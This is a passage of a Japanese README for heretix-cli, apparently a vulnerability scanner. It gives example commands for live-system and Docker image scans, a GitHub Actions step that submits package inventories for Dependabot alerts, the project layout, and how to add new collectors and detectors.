### ライブシステムスキャン

```bash
export HERETIX_API_KEY=your-secret-key
heretix-cli scan --api-url http://heretix-api:5000 --severity 7.0 --format json > /dev/null
if [ $? -eq 1 ]; then
  echo "High severity vulnerabilities found!"
  exit 1
fi
```

### Docker イメージスキャン (ビルド後チェック)

```bash
docker build -t myapp:latest .
heretix-cli scan --image myapp:latest --api-url http://heretix-api:5000 --api-key your-secret-key --severity 7.0
```

### Dockerfile ベースイメージも含めた完全スキャン

```bash
heretix-cli scan --image myapp:latest --dockerfile ./Dockerfile \
  --api-url http://heretix-api:5000 --api-key your-secret-key --severity 7.0 --format json > vuln-report.json
```

### Dependabot 連携（GitHub Actions）

```yaml
- name: パッケージ収集
  run: heretix-cli collect --output inventory.json

- name: GitHub Dependency Graph に送信
  run: heretix-cli submit inventory.json
  env:
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    # GITHUB_REPOSITORY / GITHUB_SHA / GITHUB_REF / GITHUB_RUN_ID は Actions が自動設定
```

送信後、Dependabot がスナップショットを解析し、既知の CVE を持つパッケージに対してアラートを生成する。

## プロジェクト構成

```
heretix-cli/
├── main.go                 # エントリポイント
├── cmd/                    # CLI コマンド定義 (cobra)
├── collector/              # パッケージ収集 (Collector インターフェース)
├── container/              # Docker イメージ取得・展開
├── inventory/              # 検出リスト JSON スキーマ・I/O
├── checker/                # 脆弱性 API クライアント
├── detector/               # ローカルセキュリティ検知 (Detector インターフェース)
├── report/                 # テーブル・JSON 出力
├── sbom/                   # CycloneDX SBOM 生成
└── depgraph/               # GitHub Dependency Submission API クライアント
```

## 拡張

### 新しいエコシステムコレクターを追加するには

1. `collector/` に `Collector` インターフェースの実装を追加
2. `collector/collect.go` の `CollectAll` 内のリストに登録

### 新しいローカルセキュリティ検知を追加するには

1. `detector/` に `Detector` インターフェースの実装を追加
2. `detector/detector.go` の `RunAll` 内のリストに登録
